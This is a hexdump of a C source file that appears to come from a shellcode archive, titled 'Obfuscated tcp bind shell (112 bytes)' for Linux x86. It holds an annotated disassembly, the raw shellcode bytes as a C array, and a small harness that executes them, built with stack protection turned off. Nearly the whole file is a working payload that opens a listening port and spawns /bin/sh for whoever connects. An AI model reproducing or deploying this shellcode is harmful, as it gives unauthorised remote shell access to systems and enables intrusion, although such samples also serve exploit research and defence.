00000000  2f 2a 0a 0a 54 69 74 6c  65 20 20 20 3a 20 4f 62  |/*..Title   : Ob|
00000010  66 75 73 63 61 74 65 64  20 74 63 70 20 62 69 6e  |fuscated tcp bin|
00000020  64 20 73 68 65 6c 6c 20  28 31 31 32 20 62 79 74  |d shell (112 byt|
00000030  65 73 29 0a 44 61 74 65  20 20 20 20 3a 20 33 20  |es).Date    : 3 |
00000040  4a 75 6c 79 20 32 30 31  33 0a 41 75 74 68 6f 72  |July 2013.Author|
00000050  20 20 3a 20 52 75 73 73  65 6c 6c 20 57 69 6c 6c  |  : Russell Will|
00000060  69 73 20 3c 63 6f 64 69  6e 67 75 79 40 67 6d 61  |is <codinguy@gma|
00000070  69 6c 2e 63 6f 6d 3e 0a  53 79 73 74 65 6d 20 20  |il.com>.System  |
00000080  3a 20 4c 69 6e 75 78 2f  78 38 36 20 28 53 4d 50  |: Linux/x86 (SMP|
00000090  20 44 65 62 69 61 6e 20  33 2e 32 2e 34 31 2d 32  | Debian 3.2.41-2|
000000a0  20 69 36 38 36 29 0a 0a  54 6f 20 62 75 69 6c 64  | i686)..To build|
000000b0  3a 0a 67 63 63 20 2d 66  6e 6f 2d 73 74 61 63 6b  |:.gcc -fno-stack|
000000c0  2d 70 72 6f 74 65 63 74  6f 72 20 2d 7a 20 65 78  |-protector -z ex|
000000d0  65 63 73 74 61 63 6b 20  73 68 65 6c 6c 63 6f 64  |ecstack shellcod|
000000e0  65 2e 63 20 2d 6f 20 73  68 65 6c 6c 63 6f 64 65  |e.c -o shellcode|
000000f0  0a 20 20 20 20 0a 30 30  30 30 30 30 30 30 20 20  |.    .00000000  |
00000100  44 39 45 45 20 20 20 20  20 20 20 20 20 20 20 20  |D9EE            |
00000110  20 20 66 6c 64 7a 0a 30  30 30 30 30 30 30 32 20  |  fldz.00000002 |
00000120  20 39 42 44 39 37 34 32  34 46 34 20 20 20 20 20  | 9BD97424F4     |
00000130  20 20 20 66 73 74 65 6e  76 20 5b 65 73 70 2d 30  |   fstenv [esp-0|
00000140  78 63 5d 0a 30 30 30 30  30 30 30 37 20 20 35 44  |xc].00000007  5D|
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000160  70 6f 70 20 65 62 70 0a  30 30 30 30 30 30 30 38  |pop ebp.00000008|
00000170  20 20 38 44 36 44 35 39  20 20 20 20 20 20 20 20  |  8D6D59        |
00000180  20 20 20 20 6c 65 61 20  65 62 70 2c 5b 65 62 70  |    lea ebp,[ebp|
00000190  2b 30 78 35 39 5d 0a 30  30 30 30 30 30 30 42 20  |+0x59].0000000B |
000001a0  20 33 31 44 42 20 20 20  20 20 20 20 20 20 20 20  | 31DB           |
000001b0  20 20 20 78 6f 72 20 65  62 78 2c 65 62 78 0a 30  |   xor ebx,ebx.0|
000001c0  30 30 30 30 30 30 44 20  20 46 37 45 42 20 20 20  |000000D  F7EB   |
000001d0  20 20 20 20 20 20 20 20  20 20 20 69 6d 75 6c 20  |           imul |
000001e0  65 62 78 0a 30 30 30 30  30 30 30 46 20 20 46 45  |ebx.0000000F  FE|
000001f0  43 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |C3              |
00000200  69 6e 63 20 62 6c 0a 30  30 30 30 30 30 31 31 20  |inc bl.00000011 |
00000210  20 35 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | 51             |
00000220  20 20 20 70 75 73 68 20  65 63 78 0a 30 30 30 30  |   push ecx.0000|
00000230  30 30 31 32 20 20 36 41  30 36 20 20 20 20 20 20  |0012  6A06      |
00000240  20 20 20 20 20 20 20 20  70 75 73 68 20 62 79 74  |        push byt|
00000250  65 20 2b 30 78 36 0a 30  30 30 30 30 30 31 34 20  |e +0x6.00000014 |
00000260  20 36 41 30 31 20 20 20  20 20 20 20 20 20 20 20  | 6A01           |
00000270  20 20 20 70 75 73 68 20  62 79 74 65 20 2b 30 78  |   push byte +0x|
00000280  31 0a 30 30 30 30 30 30  31 36 20 20 36 41 30 32  |1.00000016  6A02|
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
000002a0  73 68 20 62 79 74 65 20  2b 30 78 32 0a 30 30 30  |sh byte +0x2.000|
000002b0  30 30 30 31 38 20 20 46  46 44 35 20 20 20 20 20  |00018  FFD5     |
000002c0  20 20 20 20 20 20 20 20  20 63 61 6c 6c 20 65 62  |         call eb|
000002d0  70 0a 30 30 30 30 30 30  31 41 20 20 38 39 43 36  |p.0000001A  89C6|
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
000002f0  76 20 65 73 69 2c 65 61  78 0a 30 30 30 30 30 30  |v esi,eax.000000|
00000300  31 43 20 20 46 45 43 33  20 20 20 20 20 20 20 20  |1C  FEC3        |
00000310  20 20 20 20 20 20 69 6e  63 20 62 6c 0a 30 30 30  |      inc bl.000|
00000320  30 30 30 31 45 20 20 35  32 20 20 20 20 20 20 20  |0001E  52       |
00000330  20 20 20 20 20 20 20 20  20 70 75 73 68 20 65 64  |         push ed|
00000340  78 0a 30 30 30 30 30 30  31 46 20 20 36 36 36 38  |x.0000001F  6668|
00000350  37 41 36 39 20 20 20 20  20 20 20 20 20 20 70 75  |7A69          pu|
00000360  73 68 20 77 6f 72 64 20  30 78 36 39 37 61 0a 30  |sh word 0x697a.0|
00000370  30 30 30 30 30 32 33 20  20 36 36 35 33 20 20 20  |0000023  6653   |
00000380  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000390  62 78 0a 30 30 30 30 30  30 32 35 20 20 38 39 45  |bx.00000025  89E|
000003a0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |1              m|
000003b0  6f 76 20 65 63 78 2c 65  73 70 0a 30 30 30 30 30  |ov ecx,esp.00000|
000003c0  30 32 37 20 20 36 41 31  30 20 20 20 20 20 20 20  |027  6A10       |
000003d0  20 20 20 20 20 20 20 70  75 73 68 20 62 79 74 65  |       push byte|
000003e0  20 2b 30 78 31 30 0a 30  30 30 30 30 30 32 39 20  | +0x10.00000029 |
000003f0  20 35 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | 51             |
00000400  20 20 20 70 75 73 68 20  65 63 78 0a 30 30 30 30  |   push ecx.0000|
00000410  30 30 32 41 20 20 35 36  20 20 20 20 20 20 20 20  |002A  56        |
00000420  20 20 20 20 20 20 20 20  70 75 73 68 20 65 73 69  |        push esi|
00000430  0a 30 30 30 30 30 30 32  42 20 20 46 46 44 35 20  |.0000002B  FFD5 |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 63 61 6c  |             cal|
00000450  6c 20 65 62 70 0a 30 30  30 30 30 30 32 44 20 20  |l ebp.0000002D  |
00000460  42 33 30 34 20 20 20 20  20 20 20 20 20 20 20 20  |B304            |
00000470  20 20 6d 6f 76 20 62 6c  2c 30 78 34 0a 30 30 30  |  mov bl,0x4.000|
00000480  30 30 30 32 46 20 20 36  41 30 31 20 20 20 20 20  |0002F  6A01     |
00000490  20 20 20 20 20 20 20 20  20 70 75 73 68 20 62 79  |         push by|
000004a0  74 65 20 2b 30 78 31 0a  30 30 30 30 30 30 33 31  |te +0x1.00000031|
000004b0  20 20 35 36 20 20 20 20  20 20 20 20 20 20 20 20  |  56            |
000004c0  20 20 20 20 70 75 73 68  20 65 73 69 0a 30 30 30  |    push esi.000|
000004d0  30 30 30 33 32 20 20 46  46 44 35 20 20 20 20 20  |00032  FFD5     |
000004e0  20 20 20 20 20 20 20 20  20 63 61 6c 6c 20 65 62  |         call eb|
000004f0  70 0a 30 30 30 30 30 30  33 34 20 20 42 33 30 35  |p.00000034  B305|
00000500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000510  76 20 62 6c 2c 30 78 35  0a 30 30 30 30 30 30 33  |v bl,0x5.0000003|
00000520  36 20 20 35 32 20 20 20  20 20 20 20 20 20 20 20  |6  52           |
00000530  20 20 20 20 20 70 75 73  68 20 65 64 78 0a 30 30  |     push edx.00|
00000540  30 30 30 30 33 37 20 20  35 32 20 20 20 20 20 20  |000037  52      |
00000550  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 65  |          push e|
00000560  64 78 0a 30 30 30 30 30  30 33 38 20 20 35 36 20  |dx.00000038  56 |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000580  75 73 68 20 65 73 69 0a  30 30 30 30 30 30 33 39  |ush esi.00000039|
00000590  20 20 46 46 44 35 20 20  20 20 20 20 20 20 20 20  |  FFD5          |
000005a0  20 20 20 20 63 61 6c 6c  20 65 62 70 0a 30 30 30  |    call ebp.000|
000005b0  30 30 30 33 42 20 20 38  39 43 33 20 20 20 20 20  |0003B  89C3     |
000005c0  20 20 20 20 20 20 20 20  20 6d 6f 76 20 65 62 78  |         mov ebx|
000005d0  2c 65 61 78 0a 30 30 30  30 30 30 33 44 20 20 33  |,eax.0000003D  3|
000005e0  31 43 39 20 20 20 20 20  20 20 20 20 20 20 20 20  |1C9             |
000005f0  20 78 6f 72 20 65 63 78  2c 65 63 78 0a 30 30 30  | xor ecx,ecx.000|
00000600  30 30 30 33 46 20 20 42  31 30 33 20 20 20 20 20  |0003F  B103     |
00000610  20 20 20 20 20 20 20 20  20 6d 6f 76 20 63 6c 2c  |         mov cl,|
00000620  30 78 33 0a 30 30 30 30  30 30 34 31 20 20 46 45  |0x3.00000041  FE|
00000630  43 39 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |C9              |
00000640  64 65 63 20 63 6c 0a 30  30 30 30 30 30 34 33 20  |dec cl.00000043 |
00000650  20 42 30 33 46 20 20 20  20 20 20 20 20 20 20 20  | B03F           |
00000660  20 20 20 6d 6f 76 20 61  6c 2c 30 78 33 66 0a 30  |   mov al,0x3f.0|
00000670  30 30 30 30 30 34 35 20  20 43 44 38 30 20 20 20  |0000045  CD80   |
00000680  20 20 20 20 20 20 20 20  20 20 20 69 6e 74 20 30  |           int 0|
00000690  78 38 30 0a 30 30 30 30  30 30 34 37 20 20 37 35  |x80.00000047  75|
000006a0  46 38 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |F8              |
000006b0  6a 6e 7a 20 30 78 34 31  0a 30 30 30 30 30 30 34  |jnz 0x41.0000004|
000006c0  39 20 20 33 31 44 42 20  20 20 20 20 20 20 20 20  |9  31DB         |
000006d0  20 20 20 20 20 78 6f 72  20 65 62 78 2c 65 62 78  |     xor ebx,ebx|
000006e0  0a 30 30 30 30 30 30 34  42 20 20 46 37 45 33 20  |.0000004B  F7E3 |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 75 6c  |             mul|
00000700  20 65 62 78 0a 30 30 30  30 30 30 34 44 20 20 35  | ebx.0000004D  5|
00000710  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
00000720  20 70 75 73 68 20 65 63  78 0a 30 30 30 30 30 30  | push ecx.000000|
00000730  34 45 20 20 45 42 31 33  20 20 20 20 20 20 20 20  |4E  EB13        |
00000740  20 20 20 20 20 20 6a 6d  70 20 73 68 6f 72 74 20  |      jmp short |
00000750  30 78 36 33 0a 30 30 30  30 30 30 35 30 20 20 35  |0x63.00000050  5|
00000760  45 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |E               |
00000770  20 70 6f 70 20 65 73 69  0a 30 30 30 30 30 30 35  | pop esi.0000005|
00000780  31 20 20 38 37 45 36 20  20 20 20 20 20 20 20 20  |1  87E6         |
00000790  20 20 20 20 20 78 63 68  67 20 65 73 70 2c 65 73  |     xchg esp,es|
000007a0  69 0a 30 30 30 30 30 30  35 33 20 20 38 37 44 43  |i.00000053  87DC|
000007b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 63  |              xc|
000007c0  68 67 20 65 62 78 2c 65  73 70 0a 30 30 30 30 30  |hg ebx,esp.00000|
000007d0  30 35 35 20 20 42 30 30  42 20 20 20 20 20 20 20  |055  B00B       |
000007e0  20 20 20 20 20 20 20 6d  6f 76 20 61 6c 2c 30 78  |       mov al,0x|
000007f0  62 0a 30 30 30 30 30 30  35 37 20 20 43 44 38 30  |b.00000057  CD80|
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00000810  74 20 30 78 38 30 0a 30  30 30 30 30 30 35 39 20  |t 0x80.00000059 |
00000820  20 35 46 20 20 20 20 20  20 20 20 20 20 20 20 20  | 5F             |
00000830  20 20 20 70 6f 70 20 65  64 69 0a 30 30 30 30 30  |   pop edi.00000|
00000840  30 35 41 20 20 36 41 36  36 20 20 20 20 20 20 20  |05A  6A66       |
00000850  20 20 20 20 20 20 20 70  75 73 68 20 62 79 74 65  |       push byte|
00000860  20 2b 30 78 36 36 0a 30  30 30 30 30 30 35 43 20  | +0x66.0000005C |
00000870  20 35 38 20 20 20 20 20  20 20 20 20 20 20 20 20  | 58             |
00000880  20 20 20 70 6f 70 20 65  61 78 0a 30 30 30 30 30  |   pop eax.00000|
00000890  30 35 44 20 20 38 39 45  31 20 20 20 20 20 20 20  |05D  89E1       |
000008a0  20 20 20 20 20 20 20 6d  6f 76 20 65 63 78 2c 65  |       mov ecx,e|
000008b0  73 70 0a 30 30 30 30 30  30 35 46 20 20 43 44 38  |sp.0000005F  CD8|
000008c0  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 69  |0              i|
000008d0  6e 74 20 30 78 38 30 0a  30 30 30 30 30 30 36 31  |nt 0x80.00000061|
000008e0  20 20 35 37 20 20 20 20  20 20 20 20 20 20 20 20  |  57            |
000008f0  20 20 20 20 70 75 73 68  20 65 64 69 0a 30 30 30  |    push edi.000|
00000900  30 30 30 36 32 20 20 43  33 20 20 20 20 20 20 20  |00062  C3       |
00000910  20 20 20 20 20 20 20 20  20 72 65 74 0a 30 30 30  |         ret.000|
00000920  30 30 30 36 33 20 20 45  38 45 38 46 46 46 46 46  |00063  E8E8FFFFF|
00000930  46 20 20 20 20 20 20 20  20 63 61 6c 6c 20 64 77  |F        call dw|
00000940  6f 72 64 20 30 78 35 30  0a 30 30 30 30 30 30 36  |ord 0x50.0000006|
00000950  38 20 20 32 46 20 20 20  20 20 20 20 20 20 20 20  |8  2F           |
00000960  20 20 20 20 20 64 61 73  0a 30 30 30 30 30 30 36  |     das.0000006|
00000970  39 20 20 36 32 36 39 36  45 20 20 20 20 20 20 20  |9  62696E       |
00000980  20 20 20 20 20 62 6f 75  6e 64 20 65 62 70 2c 5b  |     bound ebp,[|
00000990  65 63 78 2b 30 78 36 65  5d 0a 30 30 30 30 30 30  |ecx+0x6e].000000|
000009a0  36 43 20 20 32 46 20 20  20 20 20 20 20 20 20 20  |6C  2F          |
000009b0  20 20 20 20 20 20 64 61  73 0a 30 30 30 30 30 30  |      das.000000|
000009c0  36 44 20 20 32 46 20 20  20 20 20 20 20 20 20 20  |6D  2F          |
000009d0  20 20 20 20 20 20 64 61  73 0a 30 30 30 30 30 30  |      das.000000|
000009e0  36 45 20 20 37 33 36 38  20 20 20 20 20 20 20 20  |6E  7368        |
000009f0  20 20 20 20 20 20 6a 6e  63 20 30 78 64 38 0a 2a  |      jnc 0xd8.*|
00000a00  2f 0a 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 64  |/..#include <std|
00000a10  69 6f 2e 68 3e 0a 0a 75  6e 73 69 67 6e 65 64 20  |io.h>..unsigned |
00000a20  63 68 61 72 20 63 6f 64  65 5b 5d 20 3d 20 5c 0a  |char code[] = \.|
00000a30  22 5c 78 64 39 5c 78 65  65 5c 78 39 62 5c 78 64  |"\xd9\xee\x9b\xd|
00000a40  39 5c 78 37 34 5c 78 32  34 5c 78 66 34 5c 78 35  |9\x74\x24\xf4\x5|
00000a50  64 5c 78 38 64 5c 78 36  64 5c 78 35 39 5c 78 33  |d\x8d\x6d\x59\x3|
00000a60  31 5c 78 64 62 5c 78 66  37 22 0a 22 5c 78 65 62  |1\xdb\xf7"."\xeb|
00000a70  5c 78 66 65 5c 78 63 33  5c 78 35 31 5c 78 36 61  |\xfe\xc3\x51\x6a|
00000a80  5c 78 30 36 5c 78 36 61  5c 78 30 31 5c 78 36 61  |\x06\x6a\x01\x6a|
00000a90  5c 78 30 32 5c 78 66 66  5c 78 64 35 5c 78 38 39  |\x02\xff\xd5\x89|
00000aa0  5c 78 63 36 22 0a 22 5c  78 66 65 5c 78 63 33 5c  |\xc6"."\xfe\xc3\|
00000ab0  78 35 32 5c 78 36 36 5c  78 36 38 5c 78 37 61 5c  |x52\x66\x68\x7a\|
00000ac0  78 36 39 5c 78 36 36 5c  78 35 33 5c 78 38 39 5c  |x69\x66\x53\x89\|
00000ad0  78 65 31 5c 78 36 61 5c  78 31 30 5c 78 35 31 22  |xe1\x6a\x10\x51"|
00000ae0  0a 22 5c 78 35 36 5c 78  66 66 5c 78 64 35 5c 78  |."\x56\xff\xd5\x|
00000af0  62 33 5c 78 30 34 5c 78  36 61 5c 78 30 31 5c 78  |b3\x04\x6a\x01\x|
00000b00  35 36 5c 78 66 66 5c 78  64 35 5c 78 62 33 5c 78  |56\xff\xd5\xb3\x|
00000b10  30 35 5c 78 35 32 5c 78  35 32 22 0a 22 5c 78 35  |05\x52\x52"."\x5|
00000b20  36 5c 78 66 66 5c 78 64  35 5c 78 38 39 5c 78 63  |6\xff\xd5\x89\xc|
00000b30  33 5c 78 33 31 5c 78 63  39 5c 78 62 31 5c 78 30  |3\x31\xc9\xb1\x0|
00000b40  33 5c 78 66 65 5c 78 63  39 5c 78 62 30 5c 78 33  |3\xfe\xc9\xb0\x3|
00000b50  66 5c 78 63 64 22 0a 22  5c 78 38 30 5c 78 37 35  |f\xcd"."\x80\x75|
00000b60  5c 78 66 38 5c 78 33 31  5c 78 64 62 5c 78 66 37  |\xf8\x31\xdb\xf7|
00000b70  5c 78 65 33 5c 78 35 31  5c 78 65 62 5c 78 31 33  |\xe3\x51\xeb\x13|
00000b80  5c 78 35 65 5c 78 38 37  5c 78 65 36 5c 78 38 37  |\x5e\x87\xe6\x87|
00000b90  22 0a 22 5c 78 64 63 5c  78 62 30 5c 78 30 62 5c  |"."\xdc\xb0\x0b\|
00000ba0  78 63 64 5c 78 38 30 5c  78 35 66 5c 78 36 61 5c  |xcd\x80\x5f\x6a\|
00000bb0  78 36 36 5c 78 35 38 5c  78 38 39 5c 78 65 31 5c  |x66\x58\x89\xe1\|
00000bc0  78 63 64 5c 78 38 30 5c  78 35 37 22 0a 22 5c 78  |xcd\x80\x57"."\x|
00000bd0  63 33 5c 78 65 38 5c 78  65 38 5c 78 66 66 5c 78  |c3\xe8\xe8\xff\x|
00000be0  66 66 5c 78 66 66 5c 78  32 66 5c 78 36 32 5c 78  |ff\xff\x2f\x62\x|
00000bf0  36 39 5c 78 36 65 5c 78  32 66 5c 78 32 66 5c 78  |69\x6e\x2f\x2f\x|
00000c00  37 33 5c 78 36 38 22 3b  0a 0a 6d 61 69 6e 28 29  |73\x68";..main()|
00000c10  0a 7b 0a 20 20 20 20 70  72 69 6e 74 66 28 22 53  |.{.    printf("S|
00000c20  68 65 6c 6c 63 6f 64 65  20 4c 65 6e 67 74 68 3a  |hellcode Length:|
00000c30  20 25 64 5c 6e 22 2c 20  73 69 7a 65 6f 66 28 63  | %d\n", sizeof(c|
00000c40  6f 64 65 29 2d 31 29 3b  0a 20 20 20 20 69 6e 74  |ode)-1);.    int|
00000c50  20 28 2a 72 65 74 29 28  29 20 3d 20 28 69 6e 74  | (*ret)() = (int|
00000c60  28 2a 29 28 29 29 63 6f  64 65 3b 0a 20 20 20 20  |(*)())code;.    |
00000c70  72 65 74 28 29 3b 0a 7d                           |ret();.}|
00000c78
